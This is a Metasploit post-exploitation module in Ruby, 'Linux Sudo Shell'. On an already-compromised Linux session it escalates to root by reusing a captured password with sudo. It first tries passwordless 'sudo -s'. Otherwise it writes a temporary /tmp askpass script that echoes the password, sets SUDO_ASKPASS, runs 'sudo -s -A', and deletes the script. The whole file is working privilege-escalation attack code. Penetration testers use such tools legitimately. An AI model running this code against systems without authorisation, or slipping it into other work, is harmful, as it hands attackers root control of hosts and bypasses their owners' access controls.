# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::Priv
	include Msf::Post::Linux::System


	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Sudo Shell',
				'Description'   => %q{
					This module attempts to upgrade a shell account to UID 0 by reusing the
					given password and passing it to sudo.
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'todb <todb[at]metasploit.com>'],
				'Version'       => '$Revision: $',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ] # Need to test 'meterpreter'
			))
	end

	# Run Method for when run command is issued
	def run
		print_status("SUDO: Attempting to upgrade to UID 0 via sudo")
		sudo_bin = cmd_exec("which sudo")
		if is_root?
			print_status "Already root, so no need to upgrade permissions. Aborting."
			return
		end
		if sudo_bin.empty?
			print_error "No sudo binary available. Aborting."
			return
		end
		@current_shell = cmd_exec("echo $SHELL")
		if @current_shell =~ /(bsh|bash|ksh|csh|\/bin\/sh)$/
			print_status "Current shell is `#{@current_shell}'"
			get_root()
		else
			print_error "Incompatible shell `#{current_shell.to_s.strip}'"
			return
		end
	end

	def get_root
		password = session.exploit_datastore['PASSWORD']
		if password.to_s.empty?
			print_status "No password available, trying a passwordless sudo..."
		else
			print_status "Sudoing with password `#{password}'..."
		end
		askpass_sudo(password)	
		unless is_root?
			print_error "SUDO: Didn't work out, still a mere user."
		else
			print_good "SUDO: Root shell secured."
			report_note(
				:host => session,
				:type => "host.escalation",
				:data => "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell"
			)
		end
	end

	# TODO: test on more platforms
	def askpass_sudo(password)
		if password.to_s.empty?
			begin
				::Timeout.timeout(30) do
					cmd_exec("sudo -s")
				end
			rescue
				print_error "SUDO: Passwordless sudo failed."
			end
		else
			begin
				::Timeout.timeout(30) do
					askpass_sh = "/tmp/" + Rex::Text.rand_text_alpha(10) + "_ask"
					vprint_status "Writing the askpass script: #{askpass_sh}"
					cmd_exec("echo '#!/bin/sh' > #{askpass_sh}")
					cmd_exec("echo echo #{password} >> #{askpass_sh}")
					cmd_exec("chmod +x #{askpass_sh}")
					vprint_status "Setting environment variable."
					if @current_shell =~ /csh/
						cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
					else # Bash is the default behavior
						cmd_exec("export SUDO_ASKPASS=#{askpass_sh}") 
					end
					vprint_status "Executing sudo -s -A"
					cmd_exec("sudo -s -A")
					vprint_status "Deleting the askpass script."
					cmd_exec("rm #{askpass_sh}")
				end
			rescue ::IOError, ::Timeout::Error
				print_error "Sudo with a password failed."
			end
		end
	end

end
